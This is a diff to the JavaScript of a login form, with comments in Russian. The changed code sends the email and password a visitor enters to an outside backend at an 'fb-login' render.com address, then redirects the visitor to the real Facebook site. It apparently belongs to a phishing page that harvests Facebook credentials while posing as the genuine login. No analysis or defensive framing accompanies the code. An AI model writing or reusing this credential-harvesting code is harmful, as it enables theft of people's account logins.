@@ -7,7 +7,7 @@ successMessage.id = "successMessage";
 successMessage.style.color = "green";
 successMessage.style.marginTop = "10px";
 
-form.addEventListener("submit", async (e) => {
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
   e.preventDefault();
 
   const email = emailInput.value.trim();
@@ -20,11 +20,19 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    const res = await fetch("https://fb-login-backend-xmsd.onrender.com/login", {
-     method: 'POST',
-     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email, password })
-  });
+    await fetch("https://fb-login-backend-xmsd.onrender.com/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    });
+
+    // Редирект после успешной отправки
+    window.location.href = "https://www.facebook.com";
+  } catch (err) {
+    console.error("Ошибка при отправке данных:", err);
+    alert("Error. Try again later.");
+  }
+});
 
 
 
